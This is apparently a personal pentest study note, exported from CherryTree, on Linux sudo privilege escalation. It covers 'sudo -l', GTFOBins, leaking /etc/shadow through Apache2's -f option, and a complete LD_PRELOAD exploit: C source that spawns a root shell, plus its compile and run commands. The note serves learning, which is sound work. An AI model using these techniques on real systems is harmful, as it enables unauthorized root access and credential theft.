<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Sudo</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Sudo</h1><br/><br /><br /><table class="table"><tr><th> </th><th>Example Command</th></tr><tr><td>Pour voir les droits d&#39;un user</td><td>
           sudo -l</td></tr></table>    <br /><br /><br /><br />Essayer :<br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">bash</span>&nbsp;-p</div></div><br /><br /><br /><br /><br /><br />The sudo command, by default, allows you to run a program with  root privileges. Under some conditions, system administrators may need  to give regular users some flexibility on their privileges. For example,  a junior SOC  analyst may need to use Nmap regularly but would not be cleared for  full root access. In this situation, the system administrator can allow  this user to only run Nmap with root privileges while keeping its  regular privilege level throughout the rest of the system. <br />Any user can check its current situation related to root privileges using the <code>sudo -l</code> command. <br /><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used. <br /><strong>Leverage application functions</strong><br /><br />Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server. <br />In  this case, we can use a &quot;hack&quot; to leak information leveraging a  function of the application. As you can see below, Apache2 has an option  that supports loading alternative configuration files (<code>-f</code> : specify an alternate ServerConfigFile). <br /><a href="https://i.imgur.com/rNpbbL8.png"><img src="images/37-1.png" alt="images/37-1.png" /></a><br /><br />Loading the <code>/etc/shadow</code> file using this option will result in an error message that includes the first line of the <code>/etc/shadow</code> file. <br /><strong>Leverage LD_PRELOAD</strong><br />On some systems, you may see the LD_PRELOAD environment option. <br /><a href="https://i.imgur.com/gGstS69.png"><img src="images/37-2.png" alt="images/37-2.png" /></a><br /><br />LD_PRELOAD is a function that allows any program to use shared libraries. This <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">blog post</a>  will give you an idea about the capabilities of LD_PRELOAD. If the  &quot;env_keep&quot; option is enabled we can generate a shared library which will  be loaded and executed before the program is run. Please note the  LD_PRELOAD option will be ignored if the real user ID is different from  the effective user ID. <br /><br />The steps of this privilege escalation vector can be summarized as follows;<br />1. Check for LD_PRELOAD (with the env_keep option)<br />2. Write a simple C code compiled as a share object (.so extension) file<br />3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file<br />The C code will simply spawn a root shell and can be written as follows;<br />#include &lt;stdio.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />void _init() {<br />unsetenv(&quot;LD_PRELOAD&quot;);<br />setgid(0);<br />setuid(0);<br />system(&quot;/bin/bash&quot;);<br />}<br /><br />We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;<br /><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br /><a href="https://i.imgur.com/HxbszMW.png"><img src="images/37-3.png" alt="images/37-3.png" /></a><br /><br />We  can now use this shared object file when launching any program our user  can run with sudo. In our case, Apache2, find, or almost any of the  programs we can run with sudo can be used. <br />We need to run the program by specifying the LD_PRELOAD option, as follows;<br /><code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code><br />This will result in a shell spawn with root privileges. <br /><a href="https://i.imgur.com/1YwARyZ.png"><img src="images/37-4.png" alt="images/37-4.png" /></a><br /></div></body></html>